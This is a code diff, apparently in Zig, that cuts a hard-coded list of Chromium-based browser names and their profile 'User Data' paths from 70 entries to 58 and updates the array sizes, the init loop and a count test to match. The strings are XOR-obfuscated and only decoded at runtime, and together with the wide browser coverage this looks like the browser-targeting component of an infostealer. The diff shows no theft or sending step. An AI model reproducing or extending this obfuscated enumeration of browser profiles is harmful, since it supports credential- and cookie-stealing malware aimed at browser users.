@@ -8,7 +8,7 @@ pub const BrowserInfo = struct {
 };
 
 const E = struct {
-    pub const names = [70][]const u8{
+    pub const names = [58][]const u8{
         &hash.xorEncrypt("Chrome"),
         &hash.xorEncrypt("Chrome (x86)"),
         &hash.xorEncrypt("Chrome SxS"),
@@ -67,20 +67,8 @@ const E = struct {
         &hash.xorEncrypt("Sleipnir"),
         &hash.xorEncrypt("Mail.ru Atom"),
         &hash.xorEncrypt("7Star"),
-        &hash.xorEncrypt("Sputnik"),
-        &hash.xorEncrypt("Iridium"),
-        &hash.xorEncrypt("Dragon"),
-        &hash.xorEncrypt("Epic"),
-        &hash.xorEncrypt("Uran"),
-        &hash.xorEncrypt("Slimjet"),
-        &hash.xorEncrypt("Chedot"),
-        &hash.xorEncrypt("QIP Surf"),
-        &hash.xorEncrypt("DCBrowser"),
-        &hash.xorEncrypt("UR Browser"),
-        &hash.xorEncrypt("Maple"),
-        &hash.xorEncrypt("Fenrir"),
     };
-    pub const paths = [70][]const u8{
+    pub const paths = [58][]const u8{
         &hash.xorEncrypt("Google\\Chrome\\User Data"),
         &hash.xorEncrypt("Google(x86)\\Chrome\\User Data"),
         &hash.xorEncrypt("Google\\Chrome SxS\\User Data"),
@@ -139,20 +127,8 @@ const E = struct {
         &hash.xorEncrypt("Fenrir Inc\\Sleipnir5\\setting\\modules\\ChromiumViewer"),
         &hash.xorEncrypt("Mail.Ru\\Atom\\User Data"),
         &hash.xorEncrypt("7Star\\7Star\\User Data"),
-        &hash.xorEncrypt("Sputnik\\Sputnik\\User Data"),
-        &hash.xorEncrypt("Iridium\\User Data"),
-        &hash.xorEncrypt("Comodo\\Dragon\\User Data"),
-        &hash.xorEncrypt("Epic Privacy Browser\\User Data"),
-        &hash.xorEncrypt("uCozMedia\\Uran\\User Data"),
-        &hash.xorEncrypt("Slimjet\\User Data"),
-        &hash.xorEncrypt("Chedot\\User Data"),
-        &hash.xorEncrypt("QIP Surf\\User Data"),
-        &hash.xorEncrypt("DCBrowser\\User Data"),
-        &hash.xorEncrypt("UR Browser\\User Data"),
-        &hash.xorEncrypt("MapleStudio\\ChromePlus\\User Data"),
-        &hash.xorEncrypt("Fenrir Inc\\Sleipnir5\\setting\\modules\\ChromiumViewer"),
     };
-    pub const roamings = [70]bool{
+    pub const roamings = [58]bool{
         false, false, false, false, false, true, true, false,
         false, false, false, false, false, false, false, false,
         false, false, false, false, false, false, false, false,
@@ -160,9 +136,7 @@ const E = struct {
         false, false, false, false,
         false, false, false, false, false, false, false, false,
         false, false, false, false, false, false, false, false,
-        false, false, false, false, false, false, false, false,
-        false, false, false, false, false, false, false, false,
-        false, false,
+        false, false, false, false, false, false,
     };
     pub const gecko_names = [10][]const u8{
         &hash.xorEncrypt("Firefox"),
@@ -197,7 +171,7 @@ const PATH_BUF_SIZE = 4096;
 var _chromium_init = false;
 var _chromium_names: [NAME_BUF_SIZE]u8 = undefined;
 var _chromium_paths: [PATH_BUF_SIZE]u8 = undefined;
-var _chromium_browsers: [70]BrowserInfo = undefined;
+var _chromium_browsers: [58]BrowserInfo = undefined;
 
 var _gecko_init = false;
 var _gecko_names: [NAME_BUF_SIZE]u8 = undefined;
@@ -208,7 +182,7 @@ fn initChromium() void {
     if (_chromium_init) return;
     var np: usize = 0;
     var pp: usize = 0;
-    inline for (0..70) |i| {
+    inline for (0..58) |i| {
         const ne = E.names[i];
         const pe = E.paths[i];
         hash.xorDecrypt(ne, _chromium_names[np..][0..ne.len]);
@@ -256,7 +230,7 @@ pub fn getGeckoBrowsers() []const BrowserInfo {
 
 test "chromium browser count" {
     const browsers = getChromiumBrowsers();
-    try std.testing.expect(browsers.len == 70);
+    try std.testing.expect(browsers.len == 58);
 }
 
 test "gecko browser count" {
